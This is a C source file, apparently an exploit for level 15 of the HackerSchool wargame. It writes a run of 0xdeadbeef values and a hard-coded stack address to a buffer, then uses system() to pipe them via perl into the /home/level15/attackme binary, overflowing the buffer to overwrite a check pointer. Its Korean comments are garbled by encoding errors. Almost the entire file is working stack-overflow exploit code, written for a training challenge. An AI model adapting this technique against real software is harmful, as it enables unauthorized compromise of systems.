/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level15
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define BUFSIZE 44   /* buf(0xdeadbeef)40 + &buf */

// "char buf[20] �迭" ~ "int *check ������ ����" �տ� �Է��� ��
char writecode[] = 
		"\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde"
		"\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde\xef\xbe\xad\xde";

// "char buf[20] �迭"�� ���� �ּ�
char inputaddr[] = "\xa0\xfa\xff\xbf";


int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, inputLen, shellLen;
    
    shellLen = strlen(writecode);
    inputLen = strlen(inputaddr);

	// "int *check ������ ����" �տ� "0xdeadbeef" �� �Է�
    for(i=0; i<shellLen; i++)
        shellBuf[i] = writecode[i];
    
	// "char buf[20] �迭"�� ���� �ּ� �Է�
    for(j=0; j<inputLen; j++)
        shellBuf[i++] = inputaddr[j];

    // ���� ��ɾ� ����
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level15/attackme");
    strcat(cmdBuf, "\x0a");
    system(cmdBuf);
}